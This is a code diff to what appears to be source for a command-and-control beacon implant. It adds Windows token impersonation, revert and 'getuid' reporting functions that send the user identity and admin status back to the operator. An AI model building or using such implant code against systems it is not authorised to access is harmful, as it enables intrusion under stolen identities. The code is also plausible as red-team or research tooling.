@@ -2,6 +2,7 @@
 
 #include "beacon.h"
 
+
 HANDLE gIdentityToken;
 WCHAR gIdentityDomain[20];
 datap* gIdentityCredentialsFormat;
@@ -14,7 +15,7 @@ datap* gIdentityCredentialsFormat;
  * @param size The size of the buffer.
  * @return Returns TRUE if the username is successfully retrieved, FALSE otherwise.
  */
-BOOL IdentityGetUserInfoFromToken(HANDLE hToken, char* buffer, int size)
+BOOL IdentityGetUserInfo(HANDLE hToken, char* buffer, int size)
 {
 	CHAR tokenInfo[0x1000];
 	DWORD returnLength;
@@ -37,6 +38,53 @@ BOOL IdentityGetUserInfoFromToken(HANDLE hToken, char* buffer, int size)
 	snprintf(buffer, size, "%s\\%s", domain, name);
 	buffer[size - 1] = 0;
 	return TRUE;
+}
+
+void IdentityRevertToken(void)
+{
+	if (gIdentityToken)
+		RevertToSelf();
+}
+
+void IdentityImpersonateToken(void)
+{
+	if (gIdentityToken)
+		ImpersonateLoggedOnUser(gIdentityToken);
+}
+
+void IdentityGetUidInternal(HANDLE hToken)
+{
+	char userInfo[0x200];
+	if (IdentityGetUserInfo(hToken, userInfo, sizeof(userInfo)))
+	{
+		char uidString[0x400];
+		snprintf(uidString, sizeof(uidString), BeaconIsAdmin() ? "%s (admin)" : "%s", userInfo);
+		BeaconOutput(CALLBACK_TOKEN_GETUID, uidString, strlen(uidString));
+	}
+}
+
+void IdentityGetUid(void)
+{
+	HANDLE hToken;
+
+	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)
+		|| OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+	{
+		IdentityGetUidInternal(hToken);
+
+		CloseHandle(hToken);
+	} else if (gIdentityToken)
+	{
+		IdentityRevertToken();
+
+		IdentityGetUidInternal(gIdentityToken);
+
+		IdentityImpersonateToken();
+	} else
+	{
+		LERROR("Failed to open token");
+		BeaconErrorNA(ERROR_COULD_NOT_OPEN_TOKEN);
+	}
 }
 
 /**
@@ -79,7 +127,7 @@ BOOL BeaconUseToken(HANDLE token)
 	}
 
 	// Get user information from the token and store it in the buffer
-	if (!IdentityGetUserInfoFromToken(gIdentityToken, buffer, MAX_BUFFER))
+	if (!IdentityGetUserInfo(gIdentityToken, buffer, MAX_BUFFER))
 	{
 		result = FALSE;
 		goto cleanup;
